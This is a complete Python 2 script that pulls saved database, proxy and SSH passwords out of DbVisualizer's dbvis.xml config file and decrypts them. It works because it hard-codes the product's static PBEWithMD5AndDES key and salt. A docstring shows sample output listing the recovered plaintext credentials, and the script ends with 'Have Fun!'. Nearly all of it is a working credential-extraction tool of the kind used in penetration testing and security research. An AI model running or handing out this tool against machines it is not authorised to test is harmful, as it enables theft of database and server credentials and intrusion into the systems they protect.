#!/usr/bin/env python
# decrypt_dbvis.py ~ gerry@twitter.com
# DbVisualizer uses PBEWithMD5AndDES with a static key to store passwords.
# This is a quick hack to extract and decrypt credentials from DbVisualizer config files.
# Tested against DbVisualizer Free 9.0.9 and 9.1.6
"""
[2014-03-25 02:05:30][not-the-sea workspace]$ security/p/gerry/misc/decrypt_dbvis.py
[+] DbVisualizer Password Extractor and Decryptor (@gerryeisenhaur)
[+] Additional Usage Options:
[+]     security/p/gerry/misc/decrypt_dbvis.py <config filename>
[+]     security/p/gerry/misc/decrypt_dbvis.py <encrypted password>
[+] Extracting credentials from /Users/jack/.dbvis/config70/dbvis.xml

    driver      | name                | user        | password           | connection_info
    ------------+---------------------+-------------+--------------------+---------------------------------------
    Proxy       | Default Proxy       | myproxyuser | somesecretpassword | socks://127.0.0.1:1234
    Vertica 6.1 | vertica-prod        | admin       | password1          | jdbc:vertica://127.0.0.1:5434/userdata
    PostgreSQL  | PGTest              | pg_user     | pg_pass            | Server=localhost,Port=5432,Database=
    SQLite      | Doodie              | sqlituser   | sqpasdf            | Database file name=~/mysqlite.db
    SSH         | Doodie              | root        | s1qpa              | localhost:22

[+] Done. Have Fun!
"""
import base64
from hashlib import md5
from Crypto.Cipher import DES
from os.path import expanduser
from lxml import etree, objectify
from collections import namedtuple

_iterations = 10
_salt = '\x8E\x129\x9C\aroZ'  # -114, 18, 57, -100, 7, 114, 111, 90
_password = 'qinda'
Credential = namedtuple('Credential', ['driver', 'name', 'user',
                                        'password', 'connection_info'])


class PBEWithMD5AndDES(object):

    def __init__(self, password, salt, iterations):
        key = self._generate_key(password, salt, iterations, 16)
        self.key = key[:8]
        self.iv = key[8:16]

    def _cipher(self):
        return DES.new(self.key, DES.MODE_CBC, self.iv)

    def _generate_key(self, key, salt, count, length):
        key = key + salt
        for i in range(count):
            key = md5(key).digest()
        return key[:length]

    def encrypt(self, plaintext):
        padding = 8 - len(plaintext) % 8
        plaintext += chr(padding) * padding
        return self._cipher().encrypt(plaintext)

    def decrypt(self, ciphertext):
        plaintext = self._cipher().decrypt(ciphertext)
        return plaintext[:-ord(plaintext[-1])]


def decrypt_password(password):
    pbe = PBEWithMD5AndDES(_password, _salt, _iterations)
    return pbe.decrypt(base64.b64decode(password))


def extract_credentials(config_file):
    with open(config_file, 'r') as xml_file:
        xml_blob = xml_file.read()
        root_obj = objectify.fromstring(xml_blob)
    pbe = PBEWithMD5AndDES(_password, _salt, _iterations)
    creds = []

    # Get any global proxy if it exists.
    proxy_user = getattr(root_obj.General, 'ProxyUser', None)
    proxy_pass = getattr(root_obj.General, 'ProxyPassword', None)
    if proxy_pass and proxy_pass.text:
        proxy_pass = pbe.decrypt(base64.b64decode(proxy_pass.text))
    proxy_host = getattr(root_obj.General, 'ProxyHost', None)
    proxy_port = getattr(root_obj.General, 'ProxyPort', None)
    proxy_type = getattr(root_obj.General, 'ProxyType', None)
    conn_info = "%s://%s:%s" % (proxy_type, proxy_host, proxy_port,)
    conn_info = (proxy_user and proxy_pass) and conn_info or None
    if conn_info:
        creds.append(Credential(name="Default Proxy", user=proxy_user,
            password=proxy_pass, connection_info=conn_info, driver='Proxy'))

    # Grab and decrypt each DB password along with any SSh servers
    cred = {}
    for db in root_obj.Databases.Database:
        cred['name'] = getattr(db, 'Alias', None)
        cred['user'] = getattr(db, 'Userid', None)
        password = getattr(db, 'Password', None)
        if password is not None and password.text:
            cred['password'] = pbe.decrypt(base64.b64decode(password.text))
            cred['driver'] = getattr(db, 'Driver', None)
            conn_info = getattr(db, 'Url', None)

            if not conn_info:
                params = db.UrlVariables.Driver.getchildren()
                conn_info = ",".join(["%s=%s" % (p.get('UrlVariableName'), p) for p in params])
            cred['connection_info'] = conn_info
            creds.append(Credential(**cred))

        # Note: I haven't tested anything related to ssh info extraction... no test cases
        ssh_password = getattr(db.SshSettings, 'SshPassword', None)
        if ssh_password and ssh_password.text:
            host = getattr(db.SshSettings, 'SshHost', '')
            port = getattr(db.SshSettings, 'SshPort', '22')
            ssh_cred = dict(
                driver="SSH",
                name="%s" % (cred['name'],),
                user=getattr(db.SshSettings, 'SshUserid'),
                password=pbe.decrypt(base64.b64decode(ssh_password.text)),
                connection_info="%s:%s" % (host, port,))
            creds.append(Credential(**ssh_cred))
    return creds


# Some modified snippet I had laying around. found it on stackoverflow maybe?
# TODO(gerry): Replace with prettytables.
def print_table(rows):
    headers = rows[0]._fields
    lens = []
    for i in range(len(rows[0])):
        lens.append(len(max([str(x[i]) for x in rows] + [headers[i]],
            key=lambda x:len(str(x)))))
    formats, hformats = [], []
    for i in range(len(rows[0])):
        if isinstance(rows[0][i], int):
            formats.append("%%%dd" % lens[i])
        else:
            formats.append("%%-%ds" % lens[i])
        hformats.append("%%-%ds" % lens[i])
    pattern = " | ".join(formats)
    hpattern = " | ".join(hformats)
    separator = "-+-".join(['-' * n for n in lens])
    print "   ", hpattern % tuple(headers)
    print "   ", separator
    for line in rows:
        print "   ", pattern % tuple(line)


if __name__ == '__main__':
    import sys
    import os.path
    print "[+] DbVisualizer Password Extractor and Decryptor (@gerryeisenhaur)"
    if len(sys.argv) == 2:
        if os.path.exists(sys.argv[1]):
            dbvis_config = sys.argv[1]
        else:
            dbvis_config = None
    else:
        print "[+] Additional Usage Options: "
        print "[+]     %s <config filename>" % sys.argv[0]
        print "[+]     %s <encrypted password>" % sys.argv[0]
        dbvis_config = "%s/.dbvis/config70/dbvis.xml" % os.path.expanduser("~")

    if not dbvis_config:
        password = sys.argv[1]
        print "[+] Decrypting: %s" % (password,)
        try:
            print "[+] Plain Text: %s" % (decrypt_password(password),)
        except Exception, e:
            print "[!] Error decrypting! %s" % (e,)
        sys.exit()

    print "[+] Extracting credentials from %s\n" % (dbvis_config,)
    print_table(extract_credentials(dbvis_config))
    print "\n[+] Done. Have Fun!"
